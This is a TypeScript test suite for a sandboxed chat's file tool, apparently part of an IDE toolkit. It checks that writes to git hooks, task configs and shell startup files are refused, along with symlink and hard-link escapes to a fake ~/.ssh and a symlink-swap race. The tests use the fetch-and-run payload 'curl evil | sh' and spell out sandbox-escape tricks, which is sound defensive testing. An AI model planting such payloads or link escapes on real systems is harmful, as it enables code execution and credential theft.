/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

/**
 * Files Volt reads, writes and deletes for a sandboxed chat's own tools (SEC3-3, 05-limitations item
 * 13): the gate's path rule again on the given and the real path, then a race-free open. On a real
 * disk: dangling links, links out, hard links, files that run code, read-only, stale edits, and a
 * second process that keeps swapping a folder for a symlink out of the workspace while writes and
 * reads go through (RACE: no byte lands outside, none comes back from outside).
 *
 * macOS runs everything (O_NOFOLLOW_ANY). Linux creates files only through `volt-fsd`: without it
 * the cases that create files skip loudly, or FAIL when VOLT_SANDBOX_REQUIRED is set.
 */

import assert from 'assert';
import { ChildProcess, spawn } from 'child_process';
import { existsSync, promises as fs } from 'fs';
import { tmpdir } from 'os';
import { join } from '../../../../base/common/path.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../base/test/common/utils.js';
import { helperIntegrity } from '../../../voltHelpers/node/helperIntegrity.js';
import { IVoltSandboxSettings } from '../../../voltSandbox/common/sandboxPolicy.js';
import { SANDBOX_REQUIRED as required, writeSkipNotice } from '../../../voltSandbox/test/node/sandboxSuiteGate.js';
import { IVoltChatFileRequest } from '../../../voltStdio/common/voltStdio.js';
import { chatFileOp, IChatFileOptions } from '../../node/chatFiles.js';

const isMac = process.platform === 'darwin';
const isLinux = process.platform === 'linux';
const fsdPath = isLinux ? [process.env.VOLT_FSD_PATH, join(process.cwd(), '.build', 'volt-fsd')].find((path): path is string => !!path && existsSync(path)) : undefined;
const supported = isMac || (isLinux && !!fsdPath);
const RACE_OPS = 500;

if (fsdPath) {
	const trusted = await helperIntegrity().trustDeveloperHelper('volt-fsd', fsdPath);
	if (!trusted.ok) {
		throw new Error(`volt-fsd at ${fsdPath} was refused: ${trusted.reason}`);
	}
}

const safeTest = supported ? test : test.skip;

const WORKSPACE_WRITE: IVoltSandboxSettings = { level: 'workspace-write', network: false };

interface IFixture {
	readonly base: string;
	readonly ws: string;
	/** The user's home: credentials and shell startup files, outside the workspace. */
	readonly home: string;
	readonly options: IChatFileOptions;
}

async function fixture(): Promise<IFixture> {
	const base = await fs.realpath(await fs.mkdtemp(join(tmpdir(), 'volt-chat-files-')));
	const ws = join(base, 'ws');
	const home = join(base, 'home');
	await fs.mkdir(join(ws, 'src'), { recursive: true });
	await fs.mkdir(join(ws, '.git', 'hooks'), { recursive: true });
	await fs.mkdir(join(home, '.ssh'), { recursive: true });
	await fs.mkdir(join(home, 'Library', 'LaunchAgents'), { recursive: true });
	await fs.mkdir(join(base, 'tmp'));
	await fs.writeFile(join(ws, 'src', 'app.ts'), 'const a = 1;\n');
	await fs.writeFile(join(home, '.ssh', 'id_ed25519'), 'PRIVATE KEY');
	await fs.writeFile(join(home, '.zshrc'), 'export PATH\n');
	return { base, ws, home, options: { fsdPath, home, tmpdir: join(base, 'tmp') } };
}

function request(f: IFixture, op: IVoltChatFileRequest['op'], path: string, extra: Partial<IVoltChatFileRequest> = {}): IVoltChatFileRequest {
	return { op, path, chatId: 's1', sandbox: WORKSPACE_WRITE, roots: [f.ws], ...extra };
}

/** Swaps `target` between a real folder and a symlink to `linkTo` as fast as it can, until killed. */
function startFlipper(target: string, linkTo: string): { readonly child: ChildProcess; readonly flips: () => Promise<number> } {
	const script = `
		const fs = require('fs');
		const target = process.argv[1], linkTo = process.argv[2];
		const real = target + '.real', link = target + '.link';
		const present = path => { try { fs.lstatSync(path); return true; } catch { return false; } };
		let flips = 0;
		const flip = from => {
			try { fs.renameSync(from, target); } catch { try { fs.rmSync(target, { recursive: true, force: true }); } catch { } return; }
			try { fs.renameSync(target, from); } catch { }
			flips++;
		};
		process.on('SIGTERM', () => { fs.writeFileSync(target + '.flips', String(flips)); process.exit(0); });
		const tick = () => {
			for (let i = 0; i < 200; i++) {
				if (!present(real)) { fs.mkdirSync(real); fs.writeFileSync(real + '/secret.txt', 'workspace'); }
				if (!present(link)) { fs.symlinkSync(linkTo, link); }
				flip(real);
				flip(link);
			}
			setImmediate(tick);
		};
		tick();
	`;
	const child = spawn(process.execPath, ['-e', script, target, linkTo], { env: { ELECTRON_RUN_AS_NODE: '1' }, stdio: 'ignore' });
	return {
		child,
		flips: async () => {
			if (child.exitCode === null && child.signalCode === null) {
				const exited = new Promise(resolve => child.once('exit', resolve));
				child.kill('SIGTERM');
				await exited;
			}
			return Number(await fs.readFile(`${target}.flips`, 'utf8').catch(() => '0'));
		},
	};
}

suite('Volt race-free files for a sandboxed chat\'s own tools (SEC3-3)', () => {

	ensureNoDisposablesAreLeakedInTestSuite();

	let f: IFixture;
	const flippers: ChildProcess[] = [];

	suiteSetup(() => {
		if (isLinux && !fsdPath) {
			const message = 'volt-fsd is not built here: the race-free chat file tests that create files cannot run on Linux';
			if (required) {
				throw new Error(`${message} (VOLT_SANDBOX_REQUIRED is set; failing instead of skipping)`);
			}
			writeSkipNotice(`${message}. Build it with scripts/volt-sandbox-linux-test.sh files.`, 'They are');
		}
	});

	setup(async () => {
		f = await fixture();
	});

	teardown(async () => {
		for (const child of flippers.splice(0)) {
			child.kill('SIGKILL');
		}
		await fs.rm(f.base, { recursive: true, force: true });
	});

	safeTest('SEC3-3a: writes and reads in the workspace; files that run code and a read-only chat are refused', async () => {
		const written = await chatFileOp(request(f, 'write', join(f.ws, 'src', 'new', 'b.ts'), { content: 'export {};\n' }), f.options);
		assert.deepStrictEqual(written, { ok: true, path: join(f.ws, 'src', 'new', 'b.ts'), existed: false });
		const read = await chatFileOp(request(f, 'read', join(f.ws, 'src', 'new', 'b.ts')), f.options);
		assert.deepStrictEqual(read, { ok: true, path: join(f.ws, 'src', 'new', 'b.ts'), content: 'export {};\n' });
		for (const rel of ['.git/hooks/pre-commit', '.git/config', '.vscode/tasks.json', '.claude/settings.json', 'sub/.vscode/launch.json', '.envrc']) {
			const result = await chatFileOp(request(f, 'write', join(f.ws, ...rel.split('/')), { content: 'curl evil | sh' }), f.options);
			assert.strictEqual(result.ok, false, rel);
			assert.strictEqual(existsSync(join(f.ws, ...rel.split('/'))), false, rel);
		}
		const readOnly = await chatFileOp(request(f, 'write', join(f.ws, 'src', 'app.ts'), { content: 'x', sandbox: { level: 'read-only', network: false } }), f.options);
		assert.strictEqual(readOnly.ok, false);
		assert.strictEqual(await fs.readFile(join(f.ws, 'src', 'app.ts'), 'utf8'), 'const a = 1;\n');
		const unsandboxed = await chatFileOp(request(f, 'write', join(f.ws, 'src', 'app.ts'), { content: 'x', sandbox: { level: 'off', network: true } }), f.options);
		assert.strictEqual(unsandboxed.ok, false, 'only a sandboxed chat\'s files come here');
	});

	safeTest('SEC3-3b: a dangling link (its target not made yet) never creates the target outside', async () => {
		const plist = join(f.home, 'Library', 'LaunchAgents', 'x.plist');
		await fs.symlink(plist, join(f.ws, 'evil'));
		await fs.symlink(join(f.home, 'Library', 'NewFolder'), join(f.ws, 'evdir'));
		for (const path of [join(f.ws, 'evil'), join(f.ws, 'evdir', 'x.plist')]) {
			const result = await chatFileOp(request(f, 'write', path, { content: '<plist/>' }), f.options);
			assert.strictEqual(result.ok, false, path);
		}
		assert.strictEqual(existsSync(plist), false);
		assert.strictEqual(existsSync(join(f.home, 'Library', 'NewFolder')), false);
	});

	safeTest('SEC3-3c: links out of the workspace are neither read nor written; hard links are not written', async () => {
		await fs.symlink(join(f.home, '.ssh'), join(f.ws, 'keys'));
		await fs.symlink(join(f.home, '.zshrc'), join(f.ws, 'rc'));
		await fs.link(join(f.home, '.zshrc'), join(f.ws, 'zshrc'));
		for (const path of [join(f.ws, 'keys', 'id_ed25519'), join(f.home, '.ssh', 'id_ed25519'), join(f.ws, 'rc')]) {
			const result = await chatFileOp(request(f, 'read', path), f.options);
			assert.strictEqual(result.ok, false, path);
			assert.ok(!JSON.stringify(result).includes('PRIVATE KEY'), path);
		}
		for (const path of [join(f.ws, 'rc'), join(f.ws, 'zshrc'), join(f.ws, 'keys', 'authorized_keys')]) {
			const result = await chatFileOp(request(f, 'write', path, { content: 'curl evil | sh\n' }), f.options);
			assert.strictEqual(result.ok, false, path);
		}
		assert.strictEqual(await fs.readFile(join(f.home, '.zshrc'), 'utf8'), 'export PATH\n');
		assert.strictEqual(existsSync(join(f.home, '.ssh', 'authorized_keys')), false);
		const hard = await chatFileOp(request(f, 'write', join(f.ws, 'zshrc'), { content: 'x' }), f.options);
		assert.deepStrictEqual(hard.ok ? 'written' : hard.refusal, 'hardlink');
	});

	safeTest('SEC3-3d: an edit is written only over the text it was made against', async () => {
		const path = join(f.ws, 'src', 'app.ts');
		const stale = await chatFileOp(request(f, 'write', path, { content: 'const a = 2;\n', expected: 'const a = 0;\n' }), f.options);
		assert.deepStrictEqual(stale.ok ? 'written' : stale.refusal, 'changed');
		assert.strictEqual(await fs.readFile(path, 'utf8'), 'const a = 1;\n');
		const fresh = await chatFileOp(request(f, 'write', path, { content: 'const a = 2;\n', expected: 'const a = 1;\n' }), f.options);
		assert.deepStrictEqual(fresh, { ok: true, path, existed: true });
		assert.strictEqual(await fs.readFile(path, 'utf8'), 'const a = 2;\n');
	});

	test('SEC3-3e: a delete removes the file itself, never through a symlink', async () => {
		await fs.symlink(join(f.home, '.zshrc'), join(f.ws, 'rc'));
		await fs.symlink(join(f.home, '.ssh'), join(f.ws, 'keys'));
		for (const path of [join(f.ws, 'rc'), join(f.ws, 'keys', 'id_ed25519'), join(f.ws, '.git', 'config')]) {
			const result = await chatFileOp(request(f, 'delete', path), f.options);
			assert.strictEqual(result.ok && result.existed, false, path);
		}
		assert.ok(existsSync(join(f.home, '.zshrc')));
		assert.ok(existsSync(join(f.home, '.ssh', 'id_ed25519')));
		const removed = await chatFileOp(request(f, 'delete', join(f.ws, 'src', 'app.ts')), f.options);
		assert.deepStrictEqual(removed, { ok: true, path: join(f.ws, 'src', 'app.ts'), existed: true });
		assert.strictEqual(existsSync(join(f.ws, 'src', 'app.ts')), false);
	});

	safeTest('SEC3-3-RACE: a folder swapped for a symlink out of the workspace while writes and reads run: no byte lands outside or comes back', async function () {
		this.timeout(60_000);
		const outside = join(f.home, 'target');
		await fs.mkdir(outside);
		await fs.writeFile(join(outside, 'secret.txt'), 'SECRET');
		const flipper = startFlipper(join(f.ws, 'dir'), outside);
		flippers.push(flipper.child);
		let writes = 0;
		let reads = 0;
		for (let i = 0; i < RACE_OPS; i++) {
			const written = await chatFileOp(request(f, 'write', join(f.ws, 'dir', `x${i % 5}.txt`), { content: 'payload' }), f.options);
			writes += written.ok ? 1 : 0;
			const read = await chatFileOp(request(f, 'read', join(f.ws, 'dir', 'secret.txt')), f.options);
			assert.ok(!(read.ok && read.content === 'SECRET'), `read ${i} came back from outside`);
			reads += read.ok ? 1 : 0;
		}
		const flips = await flipper.flips();
		assert.ok(flips > 100, `the flipper ran (${flips} flips)`);
		assert.deepStrictEqual((await fs.readdir(outside)).sort(), ['secret.txt'], 'nothing was written outside');
		// Proves the operations ran, not only that they were refused.
		assert.ok(writes > 0 && reads > 0, `some operations landed in the workspace (writes ${writes}, reads ${reads})`);
	});
});
